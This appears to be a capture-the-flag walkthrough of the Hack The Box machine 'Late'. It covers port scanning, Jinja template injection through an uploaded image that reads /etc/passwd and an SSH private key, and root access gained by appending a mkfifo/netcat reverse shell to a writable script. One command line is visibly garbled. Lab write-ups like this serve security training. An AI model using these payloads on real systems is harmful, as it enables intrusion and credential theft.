@@ -1,0 +1,198 @@
+10.10.11.156
+late.htb
+
+$ nmap -A 10.10.11.156 -vvv      
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 18:46 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:46
+Completed NSE at 18:46, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:46
+Completed NSE at 18:46, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:46
+Completed NSE at 18:46, 0.00s elapsed
+Initiating Ping Scan at 18:46
+Scanning 10.10.11.156 [2 ports]
+Completed Ping Scan at 18:46, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:46
+Completed Parallel DNS resolution of 1 host. at 18:46, 0.19s elapsed
+DNS resolution of 1 IPs took 0.19s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 18:46
+Scanning 10.10.11.156 [1000 ports]
+Discovered open port 22/tcp on 10.10.11.156
+Discovered open port 80/tcp on 10.10.11.156
+Increasing send delay for 10.10.11.156 from 0 to 5 due to max_successful_tryno increase to 4
+Completed Connect Scan at 18:47, 19.52s elapsed (1000 total ports)
+Initiating Service scan at 18:47
+Scanning 2 services on 10.10.11.156
+Completed Service scan at 18:47, 6.25s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.11.156.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 5.38s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 0.82s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 0.00s elapsed
+Nmap scan report for 10.10.11.156
+Host is up, received syn-ack (0.15s latency).
+Scanned at 2022-07-16 18:46:52 EDT for 32s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
+|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
+80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
+|_http-title: Late - Best online image tools
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:47
+Completed NSE at 18:47, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.59 seconds
+
+Nothing much of interest, but we know there's a website.
+Edit hostfile:
+sudo nano /etc/hosts
+and add this line
+10.10.11.156 late.htb images.late.htb
+
+Looking over http://late.htb gives us nothing, but looking at http://images.late.htb, we find a form with which to upload images.
+The title informs us that the system uses flask, which is python. Perhaps this is subject to jinja SSTI?
+
+Using https://cloudconvert.com/txt-to-jpg, we can create a text file with {{7*7}} as its contents, upload and convert to an image, then upload to the site.
+Doing so, we get a results.txt file. Upon opening the file, we find that flask is in fact parsing our expression and returning <p>49</p>. Let's see how we can leverage this.
+
+If we create a text file with the contents of {{ ‘’.__class__.__mro__[1].__subclasses__() }}, convert it to an image and upload it to our target, we get results showing all of the classes we can interact with. At index 245 is subprocess.Popen which is vulnerable. Recreate the text file with the contents of {{(''.__class__).__mro__[1].__subclasses__()[245]("cat /etc/passwd", stdout=-1, shell=True).communicate()}}, convert and upload, and we get:
+root:x:0:0:root:/root:/bin/bash\n
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n
+bin:x:2:2:bin:/bin:/usr/sbin/nologin\n
+sys:x:3:3:sys:/dev:/usr/sbin/nologin\n
+sync:x:4:65534:sync:/bin:/bin/sync\n
+games:x:5:60:games:/usr/games:/usr/sbin/nologin\n
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\n
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\n
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin\n
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\n
+lxd:x:105:65534::/var/lib/lxd/:/bin/false\n
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\n
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\n
+pollinate:x:109:1::/var/cache/pollinate:/bin/false\n
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash\n
+rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin\n
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n
+avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\n
+cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\n
+saned:x:115:119::/var/lib/saned:/usr/sbin/nologin\n
+colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n
+pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n
+geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin\n
+smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin\n
+smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin\n
+
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash\n
+Here we find our target account for login. Lets modify our text file once again and use {{(''.__class__).__mro__[1].__subclasses__()[245]("cat ~/.ssh/id_rsa", stdout=-1, shell=True).communicate()}}
+
+Now we get the private key and can use it for ssh login. Modify your results as necessary and save as ~/id_rsa.
+chmod 600 ~/id_rsa
+We can now log in with:
+ssh svc_acc@10.10.11.156 -i ~/id_rsa
+
+Grab the user flag.
+
+Enumerating further, we run
+svc_acc@late:~$ echo $PATH
+/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+svc_acc@late:~$ ls -alF /usr/local/sbin
+total 20
+drwxr-xr-x  2 svc_acc svc_acc 4096 Jul 17 01:01 ./
+drwxr-xr-x 10 root    root    4096 Aug  6  2020 ../
+-rwxrwxr-x  1 svc_acc svc_acc   27 Jul 16 17:47 cp*
+-rwxrwxr-x  1 svc_acc svc_acc   54 Jul 16 13:09 date*
+-rwxr-xr-x  1 svc_acc svc_acc  433 Jul 17 01:01 ssh-alert.sh*
+
+This means we can add some code to ssh-alert.sh and have it executed. :)
+
+run
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f' >> ssh-alert.sh; ssh localhost "exit"bin/sh -i 2>&1|nc IP
+Replace IP and PORT with whatever ip and port you have a nc listener running on
+
+In your other terminal with your listener you should have your session up:
+$ nc -lvnp 4449                  
+listening on [any] 4449 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.156] 37028
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+# cd root
+# ls
+root.txt
+scripts
+# cat root.txt
+
+
